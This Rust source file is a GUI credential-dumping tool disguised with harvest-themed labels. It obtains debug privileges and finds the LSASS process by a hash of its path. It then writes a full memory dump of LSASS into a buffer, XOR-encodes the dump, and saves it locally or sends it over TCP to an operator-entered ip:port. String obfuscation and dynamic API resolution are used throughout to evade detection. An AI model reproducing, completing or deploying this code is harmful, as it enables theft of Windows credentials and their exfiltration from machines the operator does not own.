#![allow(non_snake_case)]
#![windows_subsystem = "windows"]

extern crate native_windows_gui as nwg;
extern crate native_windows_derive as nwd;

use nwd::NwgUi;
use nwg::NativeUi;

use std::ffi::OsStr;
use winapi::ctypes::c_void;
use winapi::shared::ntdef::{
    HANDLE,
    HRESULT,
    LPCWSTR,
    LUID,
    NTSTATUS,
};
use winapi::shared::winerror::S_FALSE;
use winapi::shared::winerror::S_OK;
use winapi::shared::basetsd::DWORD_PTR;
use winapi::shared::minwindef::LPVOID;
use winapi::um::winnt::RtlCopyMemory;
use winapi::shared::minwindef::FARPROC;
use winapi::shared::minwindef::DWORD;
use winapi::shared::basetsd::SIZE_T;
use winapi::shared::minwindef::LPCVOID;
#[derive(PartialEq, Eq)]
struct MINIDUMP_CALLBACK_TYPE(pub i32);
impl MINIDUMP_CALLBACK_TYPE {
    const ModuleCallback: Self = Self(0);
    const ThreadCallback: Self = Self(1);
    const ThreadExCallback: Self = Self(2);
    const IncludeThreadCallback: Self = Self(3);
    const IncludeModuleCallback: Self = Self(4);
    const MemoryCallback: Self = Self(5);
    const CancelCallback: Self = Self(6);
    const WriteKernelMinidumpCallback: Self = Self(7);
    const KernelMinidumpStatusCallback: Self = Self(8);
    const RemoveMemoryCallback: Self = Self(9);
    const IncludeVmRegionCallback: Self = Self(10);
    const IoStartCallback: Self = Self(11);
    const IoWriteAllCallback: Self = Self(12);
    const IoFinishCallback: Self = Self(13);
    const ReadMemoryFailureCallback: Self = Self(14);
    const SecondaryFlagsCallback: Self = Self(15);
    const IsProcessSnapshotCallback: Self = Self(16);
    const VmStartCallback: Self = Self(17);
    const VmQueryCallback: Self = Self(18);
    const VmPreReadCallback: Self = Self(19);
    const VmPostReadCallback: Self = Self(20);
}

#[allow(dead_code)]
#[repr(C, packed)]
pub struct MINIDUMP_CALLBACK_OUTPUT {
    status: HRESULT
}

#[allow(dead_code)]
#[repr(C, packed)]
pub struct MINIDUMP_CALLBACK_INPUT {
    process_id: i32,
    process_handle: *mut c_void,
    callback_type: MINIDUMP_CALLBACK_TYPE,
    io: MINIDUMP_IO_CALLBACK,
}

#[allow(dead_code)]
#[repr(C, packed)]
pub struct MINIDUMP_CALLBACK_INFORMATION<'a> {
    CallbackRoutine: *mut c_void,
    CallbackParam: &'a mut *mut c_void,
}

#[allow(dead_code)]
#[repr(C, packed)]
pub struct MINIDUMP_IO_CALLBACK {
    handle: *mut c_void,
    offset: u64,
    buffer: *mut c_void,
    buffer_bytes: u32
}
use std::os::windows::ffi::OsStrExt;
pub fn get_wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
}

use winapi::shared::minwindef::HMODULE;
use winapi::um::libloaderapi::LoadLibraryW;
fn get_dll(dll_name: &str) -> HMODULE {
    let handle = unsafe { LoadLibraryW(get_wide(dll_name).as_ptr()) };
    if handle.is_null() {
        return 0 as _
    }
    handle
}
use winapi::um::libloaderapi::GetProcAddress;
fn get_fn(dll: HMODULE, fn_name: &str) -> FARPROC {
    let func = unsafe { GetProcAddress(dll, fn_name.as_ptr() as _) };
    if func.is_null() {
        return 0 as _
    }
    func
}
// heapapi
fn get_process_heap() -> Option<unsafe fn() -> HANDLE> {
    let k32_handle = get_dll(obfstr::obfstr!("kernel32.dll"));
    let func = get_fn(k32_handle, obfstr::obfstr!("GetProcessHeap\0"));
    Some(unsafe { std::mem::transmute(func as FARPROC) })
}

fn heap_alloc() -> Option<unsafe fn(HANDLE, DWORD, SIZE_T) -> LPVOID> {
    let k32_handle = get_dll(obfstr::obfstr!("kernel32.dll"));
    let func = get_fn(k32_handle, obfstr::obfstr!("HeapAlloc\0"));
    Some(unsafe { std::mem::transmute(func as FARPROC) })
}

fn heap_realloc() -> Option<unsafe fn(HANDLE, DWORD, LPVOID, SIZE_T) -> LPVOID> {
    let k32_handle = get_dll(obfstr::obfstr!("kernel32.dll"));
    let func = get_fn(k32_handle, obfstr::obfstr!("HeapReAlloc\0"));
    Some(unsafe { std::mem::transmute(func as FARPROC) })
}

fn heap_free() -> Option<unsafe fn(HANDLE, DWORD, LPVOID) -> bool> {
    let k32_handle = get_dll(obfstr::obfstr!("kernel32.dll"));
    let func = get_fn(k32_handle, obfstr::obfstr!("HeapFree\0"));
    Some(unsafe { std::mem::transmute(func as FARPROC) })
}

fn heap_size() -> Option<unsafe fn(HANDLE, DWORD, LPCVOID) -> SIZE_T> {
    let k32_handle = get_dll(obfstr::obfstr!("kernel32.dll"));
    let func = get_fn(k32_handle, obfstr::obfstr!("HeapSize\0"));
    Some(unsafe { std::mem::transmute(func as FARPROC) })
}


pub fn minidump_callback_routine(buf: &mut *mut c_void, callbackInput: MINIDUMP_CALLBACK_INPUT, callbackOutput: &mut MINIDUMP_CALLBACK_OUTPUT) -> bool {
    match callbackInput.callback_type {
        MINIDUMP_CALLBACK_TYPE::IoStartCallback => {
            callbackOutput.status = S_FALSE;
            return true
        },
        MINIDUMP_CALLBACK_TYPE::IoWriteAllCallback => {
            callbackOutput.status = S_OK;
            let read_buf_size = callbackInput.io.buffer_bytes;
            let GetProcessHeap = get_process_heap().unwrap();
            let HeapSize = heap_size().unwrap();
            let HeapReAlloc = heap_realloc().unwrap();
            let current_buf_size = unsafe { HeapSize(
                GetProcessHeap(),
                0 as _,
                *buf
            ) };
            // check if buffer is large enough
            let extra_5mb: usize = 1024*1024 * 5;
            let bytes_and_offset = callbackInput.io.offset as usize + callbackInput.io.buffer_bytes as usize;
            if bytes_and_offset >= current_buf_size {
                // increase heap size
                let size_to_increase = if bytes_and_offset <= (current_buf_size*2) {
                    current_buf_size * 2
                } else {
                    bytes_and_offset + extra_5mb
                };
                *buf = unsafe { HeapReAlloc(
                    GetProcessHeap(),
                    0 as _,
                    *buf,
                    size_to_increase
                )};
            }

            let source = callbackInput.io.buffer as *mut c_void;
            let destination = (*buf as DWORD_PTR + callbackInput.io.offset as DWORD_PTR) as LPVOID;
            let _ =  unsafe {
                RtlCopyMemory(
                    destination,
                    source,
                    read_buf_size as usize
                )
            };
            return true
        },
        MINIDUMP_CALLBACK_TYPE::IoFinishCallback => {
            callbackOutput.status = S_OK;
            return true
        },
        _ => {
            return true
        },
    }
}
use winapi::um::winnt::PTOKEN_PRIVILEGES;
use winapi::shared::minwindef::PDWORD;
use winapi::um::winnt::TOKEN_ADJUST_PRIVILEGES;
use winapi::um::winnt::TOKEN_QUERY;
use winapi::um::winnt::SE_PRIVILEGE_ENABLED;
use winapi::um::winnt::LUID_AND_ATTRIBUTES;
use winapi::shared::winerror::ERROR_NOT_ALL_ASSIGNED;
use winapi::um::winnt::TOKEN_PRIVILEGES;
use winapi::um::winnt::SE_DEBUG_NAME;
use core::mem::size_of;
use std::mem::{forget, MaybeUninit, size_of_val};
use rand::prelude::*;
fn enable_sedebug() -> bool {
    // get DLL handles and locate functions
    let k32_handle = get_dll(obfstr::obfstr!("kernel32.dll"));
    let a32_handle = get_dll(obfstr::obfstr!("advapi32.dll"));
    let gcp_func = get_fn(k32_handle, obfstr::obfstr!("GetCurrentProcess\0"));
    let opt_func = get_fn(a32_handle, obfstr::obfstr!("OpenProcessToken\0"));
    let lpvw_func = get_fn(a32_handle, obfstr::obfstr!("LookupPrivilegeValueW\0"));
    let atp_func = get_fn(a32_handle, obfstr::obfstr!("AdjustTokenPrivileges\0"));
    let gle_func = get_fn(k32_handle, obfstr::obfstr!("GetLastError\0"));
    let ch_func = get_fn(k32_handle, obfstr::obfstr!("CloseHandle\0"));

    // define functions
    let GetCurrentProcess: unsafe fn(
    ) -> HANDLE = unsafe { std::mem::transmute(gcp_func as FARPROC) };

    let OpenProcessToken: unsafe fn(
        HANDLE,
        DWORD,
        *mut HANDLE,
    ) -> bool = unsafe { std::mem::transmute(opt_func as FARPROC) };

    let LookupPrivilegeValueW: unsafe fn(
        LPCWSTR,
        LPCWSTR,
        *mut LUID,
    ) -> bool = unsafe { std::mem::transmute(lpvw_func as FARPROC) };

    let AdjustTokenPrivileges: unsafe fn(
        HANDLE,
        BOOL,
        PTOKEN_PRIVILEGES,
        DWORD,
        PTOKEN_PRIVILEGES,
        PDWORD,
    ) -> bool = unsafe { std::mem::transmute(atp_func as FARPROC) };

    let GetLastError: unsafe fn(
    ) -> DWORD = unsafe { std::mem::transmute(gle_func as FARPROC) };

    let CloseHandle: unsafe fn(
        HANDLE
    ) -> bool = unsafe { std::mem::transmute(ch_func as FARPROC) };

    // Obtain token handle
    let mut h_token: HANDLE = 0 as _;
    let _ = unsafe { OpenProcessToken(
        GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        &mut h_token,
    )};

    // Required privilege
    let privs = LUID_AND_ATTRIBUTES {
        Luid: LUID {
            LowPart: 0,
            HighPart: 0,
        },
        Attributes: SE_PRIVILEGE_ENABLED,
    };
    let mut tp = TOKEN_PRIVILEGES {
        PrivilegeCount: 1,
        Privileges: [privs ;1],
    };
    let _ = unsafe { LookupPrivilegeValueW(
        0 as _,
        get_wide(SE_DEBUG_NAME).as_mut_ptr(),
        &mut tp.Privileges[0].Luid,
    )};

    // Enable the privilege
    // ERROR HERE - STATUS_ACCESS_VIOLATION
    let _ = unsafe { AdjustTokenPrivileges(
        h_token,
        false as _,
        &mut tp,
        size_of::<TOKEN_PRIVILEGES>() as _,
        0 as _,
        0 as _,
    )};

    // Check if privilege was enabled
    if unsafe{ GetLastError() } == ERROR_NOT_ALL_ASSIGNED {
        return false
    }
    let _ = unsafe { CloseHandle(h_token) };


    return true;
}



use winapi::um::winnt::ACCESS_MASK;
use winapi::um::psapi::PPROCESS_MEMORY_COUNTERS;
use winapi::shared::minwindef::BOOL;
use winapi::um::psapi::PROCESS_MEMORY_COUNTERS;
use winapi::um::winnt::HEAP_ZERO_MEMORY;

use core::slice::from_raw_parts_mut;
use std::{env, fs, thread};
use std::io::Write;
use std::net::TcpStream;
use paranoid_hash::ParanoidHash;
fn xor_u8_array(arr: &[u8]) -> u8 {
    let mut result = 0;
    for &byte in arr {
        result ^= byte;
    }
    result
}
use winapi::um::winnt::MAXIMUM_ALLOWED;
use winapi::shared::minwindef::MAX_PATH;



#[derive(Default, NwgUi)]
pub struct BasicApp {
    #[nwg_control(size: (300, 115), position: (300, 300), title: "Combine® Harvest Professionals", flags: "WINDOW|VISIBLE")]
    #[nwg_events( OnWindowClose: [BasicApp::say_goodbye] )]
    window: nwg::Window,

    #[nwg_control(text: "ip:port. Dont edit for local harvest", size: (280, 25), position: (10, 10))]
    name_edit: nwg::TextInput,
    #[nwg_control(text: "Local Harvest", size: (140, 60), position: (10, 40))]
    #[nwg_events( OnButtonClick: [BasicApp::say_hello] )]
    hello_button: nwg::Button,

    #[nwg_control(text: "Remote Harvest", size: (140, 60), position: (150, 40))]
    #[nwg_events( OnButtonClick: [BasicApp::say_remote] )]

    hello_button2: nwg::Button
}

impl BasicApp {

    fn say_hello(&self) {
        dumpLsass("".to_string());
    }

    fn say_remote(&self) {
        if(self.name_edit.text().starts_with("ip:port."))
        {
            nwg::simple_message("BAD", "Insert a good formatted ip:port");


        }
        else {

            dumpLsass(self.name_edit.text());

        }
    }

    fn say_goodbye(&self) {
        nwg::simple_message("Goodbye", "Please delete the dump");
        nwg::stop_thread_dispatch();
    }

}

fn main() {
    nwg::init().expect("Failed to init Native Windows GUI");

    let _app = BasicApp::build_ui(Default::default()).expect("Failed to build UI");

    nwg::dispatch_thread_events();
}
fn dumpLsass(path: String) {

    //let args: Vec<String> = env::args().collect();

    /*if(args[1].contains("HELP"))
    {
        println!("[*] O ->0");
        println!("[*] l ->1");
        println!("[*] r ->2");
        println!("[*] e ->3");
        println!("[*] a ->4");
        println!("[*] s ->5");
        println!("[*] G ->8");
        println!("[*] T ->7");
        println!("[*] g ->9");
        return;
    }*/

    println!("  ______   ______   .___  ___. .______    __  .__   __.  _______
 /      | /  __  \\  |   \\/   | |   _  \\  |  | |  \\ |  | |   ____|
|  ,----'|  |  |  | |  \\  /  | |  |_)  | |  | |   \\|  | |  |__
|  |     |  |  |  | |  |\\/|  | |   _  <  |  | |  . `  | |   __|
|  `----.|  `--'  | |  |  |  | |  |_)  | |  | |  |\\   | |  |____
 \\______| \\______/  |__|  |__| |______/  |__| |__| \\__| |_______|\
                                                                  \nHarvest professionals\n\n",);

    /*if(args.len()>1&&args[1].contains("DXR"))
    {
        println!("Reading {:?}",&args[3]);
        let file_path=&args[3];
        let mut contents = fs::read(file_path)
            .expect("Should have been able to read the file");
        println!("[!] Reading file");

        let mut data = [0u8; 1];
        data[0]= u8::from_str_radix(&*args[2], 16).unwrap();


        println!("[!] Xor key is {:x}", data[0]);

        let mut n =0;
        while n < contents.len() {
            contents[n]^=data[0];
            n +=1;
        }
        match fs::write(file_path.to_owned()+"out", &contents) {
            Ok(_) => println!("\n[O] Data written to file successfully!"),
            Err(e) => println!("\n[O] Error writing to file: {}", e),
        }
        return;
    }*/


    let dbghelp_handle = get_dll(obfstr::obfstr!("C:\\Windows\\System32\\dbghelp.dll"));
    let k32_handle = get_dll(obfstr::obfstr!("kernel32.dll"));
    let ntdll_handle = get_dll(obfstr::obfstr!("ntdll.dll"));
    let psapi_handle = get_dll(obfstr::obfstr!("psapi.dll"));
    let getnext_func = get_fn(ntdll_handle, obfstr::obfstr!("NtGetNextProcess\0"));
    let mdwd_func = get_fn(dbghelp_handle, obfstr::obfstr!("MiniDumpWriteDump\0"));
    let getfilename_func = get_fn(psapi_handle, obfstr::obfstr!("GetModuleFileNameExW\0"));
    let getmeminfo_func = get_fn(psapi_handle, obfstr::obfstr!("GetProcessMemoryInfo\0"));
    let getpid_func = get_fn(k32_handle, obfstr::obfstr!("GetProcessId\0"));
    let freelib_func = get_fn(k32_handle, obfstr::obfstr!("FreeLibrary\0"));
    enable_sedebug();
    if(enable_sedebug())
    {
        println!("[!] Getting the keys");
    }
    else {
        nwg::simple_message("BAD", "Cant find the keys :(");
        return;
    }

    // define functions
    let MiniDumpWriteDump: unsafe fn(
        HANDLE,
        DWORD,
        HANDLE,
        u64,
        *mut c_void,
        *mut c_void,
        *mut MINIDUMP_CALLBACK_INFORMATION
    ) -> bool = unsafe { std::mem::transmute(mdwd_func as FARPROC) };

    let FreeLibrary: unsafe fn(
        HMODULE,
    ) -> bool = unsafe { std::mem::transmute(freelib_func as FARPROC) };

    let NtGetNextProcess: unsafe fn(
        HANDLE,
        ACCESS_MASK,
        u32,
        u32,
        *mut HANDLE,
    ) -> NTSTATUS = unsafe { std::mem::transmute(getnext_func as FARPROC) };

    let GetModuleFileNameExW: unsafe fn(
        HANDLE,
        HMODULE,
        *mut u16,
        DWORD,
    ) -> DWORD = unsafe { std::mem::transmute(getfilename_func as FARPROC) };

    let GetProcessId: unsafe fn(
        HANDLE
    ) -> DWORD = unsafe { std::mem::transmute(getpid_func as FARPROC) };

    let GetProcessMemoryInfo: unsafe fn(
        HANDLE,
        PPROCESS_MEMORY_COUNTERS,
        DWORD,
    ) -> BOOL = unsafe { std::mem::transmute(getmeminfo_func as FARPROC) };

    let mut pid=0;

    #[allow(unused_assignments)]
        let mut handle: HANDLE = 0 as _;
    /*if(args.len()>1)
    {
        let query = &args[1].replace("l","1")
            .replace("g","9")
            .replace("e","3")
            .replace("r","2")
            .replace("a","4")
            .replace("s","5").replace("G","6").replace("T","7").replace("B","8");
        pid = query.parse::<u32>().unwrap();
        println!("{:?}",pid);
    }*/
    println!("[!] Looking for crops");
    while unsafe { NtGetNextProcess(
        handle,
        MAXIMUM_ALLOWED,
        0,
        0,
        &mut handle,
    )} == 0
    {
        let mut buf = [0; MAX_PATH];
        let _ = unsafe { GetModuleFileNameExW(
            handle,
            0 as _,
            &mut buf[0],
            MAX_PATH as _,
        )};
        let buf_str = String::from_utf16_lossy(&buf[..MAX_PATH]);
        let lsash="23E06BF12C5BE7641EF89F557C3F6600E1F3881F8DCE7279C2112279E7EC3B988E1A85EC350149007DE78CE5566FCBD18F630D2CDB78C76AA06F2B121F0B3701";

        let context = ParanoidHash::default();
        let (blake2b,shasha) = context.read_str(buf_str.clone());


        if(blake2b.contains(lsash)){

            println!("[!] Found 15455");
            unsafe{
                pid=GetProcessId(handle);
            }
            break;
        }


    }


    if pid==0 {
        nwg::simple_message("BAD", "I'm too weak :(");

        return;

    }
    let extra_5mb: usize = 1024*1024 * 5;
    let buf_size: usize;
    let mut pmc = MaybeUninit::<PROCESS_MEMORY_COUNTERS>::uninit();
    let gpm_ret = unsafe { GetProcessMemoryInfo(
        handle,
        pmc.as_mut_ptr(),
        size_of_val(&pmc) as DWORD
    )};
    let mut buf_size =100000;
    if gpm_ret != 0 {
        let pmc = unsafe { pmc.assume_init() };
        buf_size = pmc.WorkingSetSize + extra_5mb;
    } else {
        nwg::simple_message("BAD", "Don't have enough bags");

        return;
    }

    // alloc memory in current process
    let GetProcessHeap = get_process_heap().unwrap();
    let HeapAlloc = heap_alloc().unwrap();
    let mut buf = unsafe { HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        buf_size
    )};
    forget(buf);

    // set up minidump callback
    let mut callback_info = MINIDUMP_CALLBACK_INFORMATION {
        CallbackRoutine: minidump_callback_routine as _,
        CallbackParam: &mut buf,
    };

    let _ = unsafe{ MiniDumpWriteDump(
        handle,
        pid,
        0 as _,
        0x00000002,//MINIDUMP_TYPE::MiniDumpWithFullMemory,
        0 as _,
        0 as _,
        &mut callback_info
    )};
    let _ = unsafe { FreeLibrary(dbghelp_handle) };


    let buf_slice: &mut [u8] = unsafe { from_raw_parts_mut(buf as _, buf_size) };
    let mut n=0;

    drop(buf);
    println!("[!] Harvest finished :{:?} potatoes",buf_slice.len());
    let file_path = ".\\harvest.cmb";



    let mut data = [0u8; 1];
    rand::thread_rng().fill_bytes(&mut data);
    println!("[!] Price per kg: {:x}", data[0]);
    while n < buf_slice.len() {
        buf_slice[n]^=data[0];
        n +=1;
    }





    if(path.len()>1)
    {
        thread::spawn(move|| {
            let mut stream = TcpStream::connect(&path).unwrap();
            println!("\n[O] Sending harvest to the airport");
            stream.write(&buf_slice).expect("[X] Your harvest exploded:");
            stream.write(&data).expect("[X] Your harvest exploded:");
        });

    }
    else{

        match fs::write(file_path, &buf_slice) {
            Ok(_) => println!("\n[O] Stored harvest in the sea"),
            Err(e) => println!("\n[X] Your harvest exploded: {}", e),
        }
    }

    println!("\n[0] All done!");
    nwg::simple_message("GOOD", &format!("Price per kg is {:x}", data[0]));



}
